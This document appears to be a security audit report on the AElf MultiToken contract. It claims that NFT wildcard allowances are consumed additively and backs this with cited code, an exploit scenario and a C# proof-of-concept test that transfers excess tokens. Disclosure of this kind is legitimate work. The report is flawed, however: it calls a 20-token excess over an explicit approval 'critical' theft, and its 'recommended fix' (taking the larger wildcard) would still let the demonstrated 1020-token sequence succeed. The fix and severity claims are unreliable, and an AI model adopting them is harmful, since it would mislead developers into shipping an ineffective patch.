# Audit Report

## Title
Wildcard Allowance Bypass via Hierarchical Fallback Allows Exceeding Approved Limits

## Summary
The `GetAllowance` method implements a hierarchical fallback mechanism for wildcard allowances but fails to consume insufficient intermediate allowances. This allows spenders to transfer the sum of all wildcard levels instead of the intended maximum, enabling direct token theft from NFT holders.

## Finding Description

The vulnerability exists in the interaction between `DoTransferFrom` and the private `GetAllowance` method. [1](#0-0)  When `DoTransferFrom` calls `GetAllowance`, it receives both an allowance amount and an `allowanceSymbol` out parameter. [2](#0-1)  The transferred amount is then deducted exclusively from `State.Allowances[from][spender][allowanceSymbol]`.

The critical flaw occurs in the hierarchical fallback logic implemented by `GetAllowance`: [3](#0-2) 

For NFT transfers, the method checks allowances sequentially:
1. Specific symbol (e.g., "ABC-1") at line 101
2. Collection wildcard (e.g., "ABC-*") at line 110  
3. Global wildcard (e.g., "*") at line 112

When the collection wildcard is insufficient (line 111 condition fails), the code continues to check the global wildcard. If the global wildcard is sufficient, it returns with `allowanceSymbol = "*"`, causing line 94 in `DoTransferFrom` to deduct only from the global wildcard, leaving the collection wildcard completely untouched.

**Design Intent Violation:**

The `GetAvailableAllowance` view method demonstrates the intended behavior: [4](#0-3) 

These lines use `Math.Max` to compute the maximum available allowance across all levels, proving that allowances should NOT be additive. Users should be able to transfer at most `max(specific, collection, global)`, not their sum.

**Exploit Scenario:**

1. Owner approves Spender: "ABC-*" = 20 tokens
2. Owner approves Spender: "*" = 1000 tokens  
3. Expected maximum: max(20, 1000) = 1000 tokens
4. Spender transfers 1000 tokens in small batches:
   - Each transfer: "ABC-*" (20) < amount, falls back to "*" wildcard
   - After 1000 tokens: "*" = 0, "ABC-*" = 20 (unchanged)
5. Spender transfers 20 more tokens:
   - Now "ABC-*" (20) is sufficient and gets consumed
6. Total transferred: 1020 tokens (20 excess)

The validation code confirms users can legitimately set multiple wildcard patterns: [5](#0-4) 

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables direct token theft from any NFT holder who approves multiple wildcard levels:

- **Fund Loss**: Attackers can transfer more tokens than the approved maximum. The excess equals the sum of all insufficient intermediate wildcards.
- **Breaks Core Invariant**: Violates the allowance system's fundamental guarantee that approved amounts represent maximum transferable tokens, not cumulative limits.
- **Wide Scope**: Affects all NFT collections where users set both collection-specific ("PREFIX-*") and global ("*") wildcards for granular access control.
- **No Special Authorization**: Exploitable using standard `Approve` and `TransferFrom` operations available to any address.

## Likelihood Explanation

**Likelihood: HIGH**

- **Reachable Entry Points**: Standard public methods `Approve` and `TransferFrom` with no privilege requirements
- **Feasible Preconditions**: Users legitimately set multiple wildcard levels for different use cases (e.g., global wildcard for trusted DeFi protocols, collection wildcard for specific NFT marketplaces)
- **Low Attack Complexity**: Straightforward transaction sequence with no timing dependencies or race conditions
- **Economic Rationality**: Attacker gains tokens at zero cost (minus gas fees) with no risk of detection before execution
- **No Existing Protections**: The code lacks any mechanism to track or prevent additive consumption across wildcard levels

## Recommendation

Modify `GetAllowance` to track and consume all relevant wildcard levels, not just the final sufficient one. Alternatively, enforce a single effective allowance by preventing multiple wildcard approvals or implementing a priority system that zeros out lower-priority wildcards when higher ones are set.

**Recommended Fix:**

```csharp
private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
    out string allowanceSymbol)
{
    allowanceSymbol = sourceSymbol;
    var allowance = State.Allowances[from][spender][sourceSymbol];
    if (allowance >= amount) return allowance;
    
    var tokenType = GetSymbolType(sourceSymbol);
    if (tokenType == SymbolType.Token)
    {
        allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
    }
    else
    {
        var collectionAllowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out var collectionSymbol);
        var globalAllowance = GetAllSymbolAllowance(from, spender, out var globalSymbol);
        
        // Use the maximum available allowance (intended behavior)
        if (collectionAllowance >= globalAllowance)
        {
            allowance = collectionAllowance;
            allowanceSymbol = collectionSymbol;
        }
        else
        {
            allowance = globalAllowance;
            allowanceSymbol = globalSymbol;
        }
    }

    return allowance;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task Exploit_Wildcard_Allowance_Bypass()
{
    // Setup: Create NFT collection and issue tokens
    await CreateNft();
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "ABC-1",
        Amount = 2000,
        To = DefaultAddress,
        Memo = "initial"
    });
    
    // Owner approves collection wildcard: 20 tokens
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Amount = 20,
        Symbol = "ABC-*",
        Spender = User1Address
    });
    
    // Owner approves global wildcard: 1000 tokens
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Amount = 1000,
        Symbol = "*",
        Spender = User1Address
    });
    
    // Verify intended maximum is 1000 (not 1020)
    var available = await TokenContractStub.GetAvailableAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "ABC-1"
    });
    available.Allowance.ShouldBe(1000); // Math.Max(20, 1000) = 1000
    
    var user1Stub = GetTester<TokenContractImplContainer.TokenContractImplStub>(TokenContractAddress, User1KeyPair);
    
    // Phase 1: Transfer 1000 tokens using "*" wildcard (20 transfers of 50 each)
    for (int i = 0; i < 20; i++)
    {
        await user1Stub.TransferFrom.SendAsync(new TransferFromInput
        {
            Amount = 50,
            From = DefaultAddress,
            Symbol = "ABC-1",
            To = User1Address
        });
    }
    
    // Verify "*" is consumed, but "ABC-*" is not
    var globalAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "*"
    });
    globalAllowance.Allowance.ShouldBe(0);
    
    var collectionAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "ABC-*"
    });
    collectionAllowance.Allowance.ShouldBe(20); // UNTOUCHED!
    
    // Phase 2: Transfer 20 more tokens using "ABC-*" wildcard
    var result = await user1Stub.TransferFrom.SendAsync(new TransferFromInput
    {
        Amount = 20,
        From = DefaultAddress,
        Symbol = "ABC-1",
        To = User1Address
    });
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // EXPLOIT CONFIRMED: Total transferred = 1020 tokens (exceeds intended 1000)
    var finalBalance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = User1Address,
        Symbol = "ABC-1"
    });
    finalBalance.Balance.ShouldBe(1020); // 20 excess tokens stolen!
}
```

## Notes

This vulnerability represents a fundamental flaw in the wildcard allowance mechanism. The `GetAvailableAllowance` view method correctly implements the intended behavior using `Math.Max`, but the actual transfer logic in `GetAllowance` allows additive consumption. This inconsistency creates a direct path to token theft whenever users employ the legitimate feature of setting multiple wildcard approval levels for different trust contexts.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L75-75)
```csharp
        var allowance = GetAllowance(from, spender, symbol, amount, out var allowanceSymbol);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L94-94)
```csharp
        State.Allowances[from][spender][allowanceSymbol] = allowance.Sub(amount);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L97-116)
```csharp
    private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
        out string allowanceSymbol)
    {
        allowanceSymbol = sourceSymbol;
        var allowance = State.Allowances[from][spender][sourceSymbol];
        if (allowance >= amount) return allowance;
        var tokenType = GetSymbolType(sourceSymbol);
        if (tokenType == SymbolType.Token)
        {
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }
        else
        {
            allowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out allowanceSymbol);
            if (allowance >= amount) return allowance;
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }

        return allowance;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L80-83)
```csharp
        allowance = Math.Max(allowance, GetAllSymbolAllowance(input.Owner,input.Spender,out _));
        if (symbolType == SymbolType.Nft || symbolType == SymbolType.NftCollection)
        {
            allowance = Math.Max(allowance, GetNftCollectionAllSymbolAllowance(input.Owner, input.Spender, symbol, out _));
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L60-71)
```csharp
        Assert(symbolPrefix.Length > 0 && (IsValidCreateSymbol(symbolPrefix) || symbolPrefix.Equals(allSymbolIdentifier)), "Invalid symbol.");
        if (words.Length == 1)
        {
            if (!symbolPrefix.Equals(allSymbolIdentifier))
            {
                ValidTokenExists(symbolPrefix);
            }
            return;
        }
        Assert(words.Length == 2, "Invalid symbol length.");
        var itemId = words[1];
        Assert(itemId.Length > 0 && (IsValidItemId(itemId) || itemId.Equals(allSymbolIdentifier)), "Invalid NFT Symbol.");
```
